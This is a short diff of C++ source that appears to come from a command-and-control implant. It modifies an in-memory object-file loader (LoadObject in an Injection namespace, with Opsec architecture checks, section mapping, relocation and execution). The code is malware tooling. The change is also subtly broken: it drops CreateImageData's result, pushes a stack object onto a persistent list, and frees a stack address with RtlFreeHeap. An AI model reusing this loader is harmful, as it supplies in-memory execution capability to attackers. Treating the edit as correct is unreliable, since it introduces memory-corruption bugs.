@@ -51,33 +51,34 @@ namespace Injection {
         }
     }
 
-    VOID LoadObject(const char* const entrypoint, uint8_t* const data, void* const args, size_t arg_size, uint32_t req_id) {
+    VOID LoadObject(const char* const entrypoint, uint8_t* const data, uint8_t* const args, size_t arg_size, uint32_t req_id) {
         HEXANE
 
-        _executable* object = Memory::Methods::CreateImageData(B_PTR(data));
+        _executable object = { };
+        Memory::Methods::CreateImageData(B_PTR(data));
 
-        object->next = Ctx->coffs;
-        Ctx->coffs = object;
+        object.next = Ctx->coffs;
+        Ctx->coffs = &object;
 
-        if (!Opsec::SeImageCheckArch(object)) {
+        if (!Opsec::SeImageCheckArch(&object)) {
             return_defer(ntstatus);
         }
 
-        if (!Memory::Objects::MapSections(object, data)) {
+        if (!Memory::Objects::MapSections(&object, data)) {
             return_defer(ntstatus);
         }
 
-        if (!Memory::Objects::BaseRelocation(object)) {
+        if (!Memory::Objects::BaseRelocation(&object)) {
             return_defer(ntstatus);
         }
 
-        if (!Memory::Execute::ExecuteObject(object, entrypoint, args, arg_size, req_id)) {
+        if (!Memory::Execute::ExecuteObject(&object, entrypoint, R_CAST(char*, args), arg_size, req_id)) {
             return_defer(ntstatus);
         }
 
     defer:
         if (ntstatus != ERROR_SUCCESS) {
-            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, object);
+            Ctx->nt.RtlFreeHeap(Ctx->heap, 0, &object);
         }
     }
 
